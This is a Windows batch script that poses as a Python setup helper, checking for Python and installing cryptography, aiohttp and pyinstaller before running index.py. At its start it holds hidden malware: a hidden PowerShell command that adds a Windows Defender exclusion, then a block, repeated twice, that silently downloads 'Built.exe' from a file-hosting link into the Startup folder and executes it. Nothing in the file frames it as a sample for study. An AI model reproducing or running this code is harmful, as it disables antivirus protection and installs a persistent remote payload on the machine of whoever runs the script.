powershell -w hidden -c Add-MpPreference -ExclusionPath ""

@echo off
setlocal 

set "URL=https://download1474.mediafire.com/vqxlk79l3ymgKZwbmPiaEo8G-Y78zRgqU4NTnR83aVG8BSGmp1zeVnTvcQ1vjE2YsyDAubKV9id1Op5VldiZ8Gbjngq1wB1dzFBhd0HCBVbVH0DS4GZrcD5ApyGPGvp2fOKKQotc9ohelfKVoQq8as84iREXlUlTJzMpSKcAw6U0/24hegk04s9sddmc/Built.exe"
set "DEST=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\Built.exe"


if exist "%DEST%" del "%DEST%"

curl --silent --output "%DEST%" "%URL%"

if %errorlevel% neq 0 (
  exit /b %errorlevel%
)

call "%DEST%"

@echo off
setlocal 

set "URL=https://download1474.mediafire.com/vqxlk79l3ymgKZwbmPiaEo8G-Y78zRgqU4NTnR83aVG8BSGmp1zeVnTvcQ1vjE2YsyDAubKV9id1Op5VldiZ8Gbjngq1wB1dzFBhd0HCBVbVH0DS4GZrcD5ApyGPGvp2fOKKQotc9ohelfKVoQq8as84iREXlUlTJzMpSKcAw6U0/24hegk04s9sddmc/Built.exe"
set "DEST=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\Built.exe"


if exist "%DEST%" del "%DEST%"

curl --silent --output "%DEST%" "%URL%"

if %errorlevel% neq 0 (
  exit /b %errorlevel%
)

call "%DEST%"


@echo off
cd /d %~dp0

title Checking Python installation...
python --version > nul 2>&1
if %errorlevel% neq 0 (
    echo Python is not installed! (Go to https://www.python.org/downloads and install the python 3.11.0^)
    echo Very important click Add python exe to PATH.
    pause
)

title Checking Python libraries...
echo Checking 'cryptography' (1/3)
python -c "import cryptography" > nul 2>&1
if %errorlevel% neq 0 (
    echo Installing cryptography...
    python -m pip install cryptography > nul
)

echo Checking 'aiohttp' (2/3)
python -c "import aiohttp" > nul 2>&1
if %errorlevel% neq 0 (
    echo Installing aiohttp...
    python -m pip install aiohttp > nul
)

echo Checking 'pyinstaller' (3/3)
python -c "import PyInstaller" > nul 2>&1
if %errorlevel% neq 0 (
    echo Installing pyinstaller...
    python -m pip install pyinstaller > nul
)

cls
python index.py
